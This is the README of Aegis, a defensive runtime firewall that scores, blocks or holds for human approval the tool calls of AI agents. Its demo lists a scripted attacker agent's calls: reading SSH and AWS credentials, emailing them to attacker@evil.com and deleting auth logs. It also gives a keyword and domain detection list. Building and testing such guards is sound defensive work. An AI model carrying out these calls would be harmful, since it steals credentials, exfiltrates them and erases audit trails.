# Aegis

Runtime firewall for AI agents, built on top of [Nasiko](https://github.com/nasiko).

As AI agents become autonomous and gain access to tools like shell execution, email, GitHub, and filesystems, there needs to be a security layer between agents and the real world. Aegis intercepts every tool call in real time, scores its risk, enforces YAML-defined policies, and blocks dangerous actions before they execute — all visible in a live terminal dashboard.

---

## How It Works

Every tool call an agent makes passes through the Aegis interceptor before execution:

```
User Query
    ↓
Nasiko Router
    ↓
Aegis Firewall  ←── policies.yaml
    ├── Risk Engine   (score 0.0–1.0)
    ├── Policy Engine (blocked tools, domain allowlist, risk threshold)
    └── Human Approval (interactive, keyboard-driven, 30s timeout)
    ↓
Tool Execution (or PermissionError if blocked)
    ↓
Trace stored to sessions/trace.jsonl
```

Each verdict is one of:

| Decision  | Condition |
|-----------|-----------|
| `ALLOW`   | Risk < 0.5 and no policy violation |
| `WARN`    | Risk ≥ 0.5 but below `max_risk_score` and no policy violation |
| `BLOCK`   | Policy violation or risk ≥ `max_risk_score` |
| `PENDING` | Tool is in `approval_required` — execution pauses until human input |

---

## Demo

Run the built-in demo agent, which simulates an attacker prompt: *"Find AWS keys on GitHub and email them"*:

```bash
pip install -r requirements.txt
python main.py
```

The demo agent fires these tool calls in sequence, 1.2 seconds apart:

```
github_search("AWS credentials site:github.com")  →  ALLOW   risk=0.10
read_file("/etc/passwd")                           →  WARN    risk=0.10
extract_secrets(".aws/credentials")                →  PENDING (approval required)
shell_exec("cat ~/.ssh/id_rsa")                    →  PENDING (approval required)
send_email("attacker@evil.com", ...)               →  BLOCK   risk=0.85  BLOCKED_TOOL
delete_file("/var/log/auth.log")                   →  BLOCK   risk=0.90  BLOCKED_TOOL
```

The terminal dashboard shows every verdict live. When a `PENDING` call appears, press `A` to approve or `D` to deny. Unanswered approvals auto-deny after 30 seconds.

---

## Terminal Dashboard

Built with [Textual](https://github.com/Textualize/textual) and [Rich](https://github.com/Textualize/rich).

```
┌─ ⚡ Tool Calls ──────────────────────────────────┐ ┌─ 📋 Event Log ──────┐
│ Time     Agent       Tool            Risk  Decision │ │ 12:01:03 ALLOW ...  │
│ 12:01:01 demo_agent  github_search   0.10  ✓ ALLOW  │ │ 12:01:04 WARN  ...  │
│ 12:01:02 demo_agent  read_file       0.10  ⚠ WARN   │ │ 12:01:05 BLOCK ...  │
│ 12:01:03 demo_agent  extract_secrets 0.95  ✗ BLOCK  │ │                     │
└─────────────────────────────────────────────────────┘ └─────────────────────┘

⚡ APPROVAL REQUIRED  tool=shell_exec  id=a3f1   A=approve  D=deny
```

Keyboard bindings: `A` approve · `D` deny · `Q` quit

The header shows a running tally of `ALLOW / WARN / BLOCK` counts. The table auto-scrolls to the latest row. Risk scores are colour-coded: green < 0.5, yellow < 0.8, red ≥ 0.8.

---

## Risk Engine

`firewall/risk_engine.py` scores each tool call from 0.0 to 1.0:

**Base score by tool name:**

| Tool | Base score |
|------|-----------|
| `extract_secrets` | 0.95 |
| `delete_file` | 0.90 |
| `send_email` | 0.85 |
| `shell_exec` | 0.75 |
| anything else | 0.10 |

**Additive modifiers** (applied to the base, capped at 1.0):

| Trigger | Bonus |
|---------|-------|
| Dangerous keyword in args: `aws_secret`, `api_key`, `password`, `token`, `credential`, `rm -rf`, `drop table`, `exfil`, `extract_secret` | +0.25 |
| Suspicious domain in args: `pastebin.com`, `ngrok.io`, `requestbin.com` | +0.30 |

The final score and a human-readable reason string are returned as a `RiskResult`.

---

## Policy Engine

`firewall/policy_engine.py` loads rules from `config/policies.yaml`. If the file is missing, a safe built-in default is used.

```yaml
blocked_tools:
  - send_email
  - delete_file

approval_required:
  - shell_exec
  - extract_secrets

allowed_domains:
  - github.com
  - arxiv.org
  - api.openai.com

max_risk_score: 0.8
```

**Evaluation order:**

1. If the tool is in `blocked_tools` → `BLOCK` with reason `BLOCKED_TOOL`
2. If the risk score ≥ `max_risk_score` → `BLOCK` with reason `RISK_THRESHOLD`
3. If the args contain `http` and no `allowed_domains` entry matches → `BLOCK` with reason `DOMAIN_NOT_ALLOWED`
4. If the tool is in `approval_required` → `PENDING` (human gate)
5. If risk ≥ 0.5 → `WARN`
6. Otherwise → `ALLOW`

---

## Approval Flow

When a tool is in `approval_required`, the firewall:

1. Emits an `approval_request` event on the event bus.
2. Suspends the tool call with `asyncio.Event`.
3. The dashboard renders an `ApprovalBanner` and waits for a keypress.
4. `A` calls `firewall.resolve_approval(call_id, True)`, `D` calls it with `False`.
5. The event is set, the coroutine resumes, and the verdict is updated to `ALLOW` or `BLOCK`.
6. If no response arrives within 30 seconds, the call is auto-denied.

---

## Event Bus

`events/event_bus.py` is a lightweight async pub/sub bus. Two channels are used:

| Channel | Published by | Consumed by |
|---------|-------------|-------------|
| `firewall_verdict` | `Firewall.evaluate()` | Dashboard UI, Phoenix logger, TraceStore |
| `approval_request` | `Firewall.evaluate()` | Dashboard UI (shows `ApprovalBanner`) |

Handlers are registered with `bus.subscribe(event, async_handler)` and fired as `asyncio.Task`s so they don't block the firewall loop.

---

## Trace & Replay

Every verdict is appended to `sessions/trace.jsonl` as a structured JSON line:

```json
{"call_id": "a3f1", "tool": "send_email", "agent": "demo_agent", "risk_score": 0.85, "decision": "BLOCK", "reason": "tool=send_email", "timestamp": "2026-05-08T12:01:05"}
```

Load and replay a past session:

```python
from traces.replay import load_session
events = load_session("sessions/trace.jsonl")
for e in events:
    print(e.decision, e.tool, e.risk_score)
```

`TraceStore` keeps an in-memory list (`trace_store.all()`) in addition to the JSONL file, so the current session can be queried without disk I/O.

---

## Nasiko Integration

Aegis ships two integration points in `nasiko/`:

**ASGI Middleware** — wraps any Nasiko agent's FastAPI app for request-level attribution:

```python
from nasiko.router_hook import AegisMiddleware
app = AegisMiddleware(app, agent_name="github-agent")
```

This attaches the agent name to every inbound A2A task so firewall verdicts are attributed correctly. Blocking at this level is not possible (the tool name isn't known yet); use the executor mixin for that.

**Executor Mixin** — intercepts individual tool calls inside `OpenAIAgentExecutor`:

```python
from nasiko.router_hook import AegisExecutorMixin

class SecureGitHubExecutor(AegisExecutorMixin, OpenAIAgentExecutor):
    _aegis_agent_name = "github-agent"
```

The mixin overrides `_call_tool()` and routes every call through `intercept()` before the method is invoked on the tool instance.

**Convenience wrapper** for ad-hoc use:

```python
from nasiko.router_hook import route
result = await route("my_tool", {"arg": "value"}, my_async_fn, agent="my-agent")
```

**AgentCard parser** — `nasiko/agentcard_parser.py` reads a Nasiko `AgentCard.json` and returns:

```python
{
    "name": "github-agent",
    "url": "http://...",
    "skills": ["search_code", "delete_branch"],
    "tags": ["exec", "write"],
    "high_risk_skills": ["delete_branch"]   # skills tagged delete/write/exec/email/secret
}
```

This metadata can be used to auto-populate `blocked_tools` or `approval_required` from the agent's own declared capabilities.

**Phoenix logger** — `nasiko/phoenix_logger.py` subscribes to `firewall_verdict` and forwards each verdict to Phoenix / OpenTelemetry. Register it at startup:

```python
from nasiko.phoenix_logger import register
register()
```

---

## Adding a New Tool

1. Create `tools/my_tool.py` and call `intercept()` before executing:

```python
from firewall.interceptor import intercept

async def my_tool(arg: str, agent: str = "demo_agent") -> dict:
    async def _run():
        return {"result": "..."}
    return await intercept("my_tool", {"arg": arg}, _run, agent)
```

2. Optionally add `my_tool` to `blocked_tools` or `approval_required` in `config/policies.yaml`.
3. Optionally add a base risk score in `firewall/risk_engine.py`'s `_HIGH_RISK_TOOLS` dict.

---

## Project Structure

```
aegis/
├── main.py                   # Entrypoint: starts UI + demo agent
├── requirements.txt
├── config/
│   └── policies.yaml         # Firewall rules
├── firewall/
│   ├── interceptor.py        # intercept() — wraps every tool call
│   ├── firewall.py           # Orchestrates risk + policy + approval
│   ├── risk_engine.py        # Scores tool calls 0.0–1.0
│   ├── policy_engine.py      # Loads and enforces YAML policies
│   └── models.py             # ToolCall, FirewallVerdict, Decision, etc.
├── agents/
│   └── demo_agent.py         # Scripted attacker scenario
├── tools/
│   ├── github_tool.py        # github_search()
│   ├── email_tool.py         # send_email()
│   ├── shell_tool.py         # shell_exec()
│   └── file_tool.py          # read_file(), delete_file(), extract_secrets()
├── ui/
│   ├── dashboard.py          # Textual app, keyboard bindings, layout
│   ├── widgets.py            # FirewallTable, StatsBar, ApprovalBanner
│   └── logs.py               # EventLog panel
├── events/
│   └── event_bus.py          # Async pub/sub bus (firewall_verdict, approval_request)
├── traces/
│   ├── storage.py            # TraceStore — records verdicts to JSONL
│   └── replay.py             # load_session() — replays past traces
├── sessions/
│   └── trace.jsonl           # Runtime session log
└── nasiko/
    ├── router_hook.py        # AegisMiddleware + AegisExecutorMixin + route()
    ├── agentcard_parser.py   # Parses AgentCard.json for skill metadata
    └── phoenix_logger.py     # Forwards verdicts to Phoenix/OTel
```

---

## Tech Stack

- Python 3.12+
- [Textual](https://github.com/Textualize/textual) — terminal UI framework
- [Rich](https://github.com/Textualize/rich) — terminal formatting
- PyYAML — policy config
- Nasiko — agent routing and orchestration platform
